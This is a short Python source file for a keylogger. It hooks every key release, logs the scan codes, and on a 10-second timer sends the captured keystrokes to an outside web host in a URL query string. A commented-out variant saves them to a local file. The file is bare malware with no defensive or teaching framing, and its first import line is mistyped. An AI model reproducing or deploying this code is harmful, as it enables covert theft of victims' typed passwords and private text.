from types peimport NoneType
import keyboard 
import urllib.request
from threading import Timer
from datetime import datetime

send_report = 10

class Keylogger:
       def __init__(self, interval, report_method = "server"):
              self.interval = interval
              self.report_method = report_method 
              self.key = "" 
              self.start_dt = datetime.now()
              self.end_dt = datetime.now()
       
       def callback(self, event):
              name = event.scan_code 
              self.key += (f'{name}.')
       
       # def report(self):
       #        self.file = f"keylog"
       #        with open(f"{self.file}.txt", "w") as f:
       #               print(self.key, file=f)
       #               print(f"[+] Saved {self.file}.txt")
       #        self.start_dt = datetime.now()
       #        self.key = ""
       #        timer = Timer(interval=self.interval, function=self.report)
       #        timer.start()

       def report(self):
              if self.key:
                     if self.report_method == "server":
                            urllib.request.urlopen(f'https://anerol.000webhostapp.com/index.html/keylogger.php?key={self.key}')
                     self.start_dt = datetime.now()
              self.key = ""
              timer = Timer(interval=self.interval, function=self.report)
              timer.start()
       
       def start(self):
              keyboard.on_release(callback = self.callback)
              self.report()
              keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=send_report, report_method="server")
    keylogger.start() 